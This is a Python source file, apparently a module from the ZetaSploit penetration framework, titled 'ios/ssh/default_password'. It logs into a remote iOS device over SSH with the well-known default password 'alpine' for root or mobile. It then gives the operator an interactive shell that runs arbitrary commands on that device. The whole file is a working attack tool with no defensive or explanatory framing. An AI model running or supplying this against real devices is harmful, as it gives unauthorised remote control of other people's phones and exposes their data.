#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys
import paramiko

from core.badges import badges
from core.helper import helper

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()

        self.thread = None
        self.controller = None
        self.sessions_id = dict()
        self.is_running = False

        self.details = {
            'Name': "ios/ssh/default_password",
            'Authors': ['enty8080'],
            'Description': "Bypass iOS OpenSSH using default password.",
            'Comment': "Default iOS root and mobile password - alpine"
        }

        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': "",
                'Required': True
            },
            'USERNAME': {
                'Description': "SSH username.",
                'Value': "root",
                'Required': True
            }
        }

    def shell(self, ssh):
        try:
            username = self.options['USERNAME']['Value']
            if username == "root":
                prompt = '#'
            else:
                prompt = '$'
            stdin, stdout, stderr = ssh.exec_command("hostname")
            hostname = stdout.readlines()[0].strip()
        except:
            return
        while True:
            try:
                stdin, stdout, stderr = ssh.exec_command("pwd")
                cwd = stdout.readlines()[0].strip()
                command = input(hostname + ':' + cwd + ' ' + username + prompt + ' ').strip()
                if command.split() != []:
                    if command.split()[0] == "exit":
                        break
                    else:
                        stdin, stdout, stderr = ssh.exec_command(command)
                        response = stdout.readlines()
                        for resp in response:
                            self.helper.output(resp.strip())
            except:
                break
        
    def run(self):
        username = self.options['USERNAME']['Value']
        remote_host = self.options['RHOST']['Value']
        self.helper.output(self.badges.G + "Exploiting " + remote_host + "...")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(remote_host, username=username, password='alpine')
        except:
            self.helper.output(self.badges.E + "Exploit failed!")
            return
        self.helper.output(self.badges.G + "Connecting to " + remote_host + "...")
        self.shell(ssh)
        self.helper.output(self.badges.W + "Connection closed.")
        ssh.close()
